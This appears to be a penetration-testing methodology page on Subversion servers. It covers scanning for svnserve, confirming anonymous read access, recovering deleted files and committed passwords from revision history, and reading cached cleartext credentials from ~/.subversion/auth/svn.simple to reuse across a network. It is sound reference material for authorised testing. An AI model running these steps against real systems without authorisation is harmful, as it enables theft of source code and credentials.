---
title: "Repository history and credentials: reaching Subversion revisions and secrets"
description: "Reaching a Subversion repository server to recover source and secrets: anonymous read over svnserve and HTTP/WebDAV, walking revision history to recover deleted files and committed credentials with svn log and svn cat, and harvesting cached Subversion credentials from disk."
keywords:
  - subversion history
  - svnserve
  - anonymous read
  - svn cat
  - cached credentials
---

# Repository history and credentials

Beyond a leaked working copy, the Subversion repository server itself holds the complete revision history. Where it allows anonymous read, that history is a source-and-secrets disclosure: every revision of every file, including files that were deleted later, is retrievable, and Subversion caches credentials on the clients that connect to it.

## Reach the server

Subversion is served over `svn://` (the svnserve daemon on TCP 3690) or over HTTP/HTTPS with the Apache `mod_dav_svn` module. Anonymous read is a common default on svnserve: `svnserve.conf` with `anon-access = read` lets anyone list and check out.

```bash
nmap -p3690,80,443 -sV <target>
svn info  svn://<target>/repo        # or an http(s)://<target>/svn/repo URL
svn ls -R svn://<target>/repo         # anonymous listing => anonymous read is on
```

A successful `svn ls`/`svn info` with no credentials confirms anonymous read.

## Walk the history

`svn log` enumerates revisions and `svn cat` retrieves a file at any revision. For a path that still exists at HEAD, `-r` alone works; for a path that was deleted, pin the peg revision with `@<rev>` so Subversion locates it in the revision where it existed rather than at HEAD (the implicit peg for a URL):

```bash
svn log -v svn://<target>/repo                      # revisions, with the paths each one changed
svn cat 'svn://<target>/repo/config/db.ini@42'      # peg at r42: recovers the file even if deleted at HEAD
svn export svn://<target>/repo ./repo-head          # the full current tree in one step
```

Read the `-v` log for paths marked `D` (deleted): the file is gone from HEAD, but `svn cat <url>@<rev>` pegged at a revision before the delete brings it back. A "remove the password" commit is recovered exactly this way.

## Cached credentials

Subversion stores credentials used to authenticate to a repository under the user's config directory, often unencrypted. On a host you already have a foothold on, these yield working repository (and sometimes domain) credentials:

```bash
ls ~/.subversion/auth/svn.simple/          # one file per realm
cat ~/.subversion/auth/svn.simple/*        # username and, on many platforms, the password in cleartext
```

## Follow-on

Recovered source and config files carry database, service, and deployment credentials; the cached `svn.simple` entries are directly reusable against the repository and anywhere the password was reused. Feed both into credential reuse across the estate.

## References

- [svnserve and anonymous access (SVN book)](https://svnbook.red-bean.com/en/1.7/svn.serverconfig.svnserve.html)
- [Subversion client credential caching](https://svnbook.red-bean.com/en/1.7/svn.serverconfig.netmodel.html)
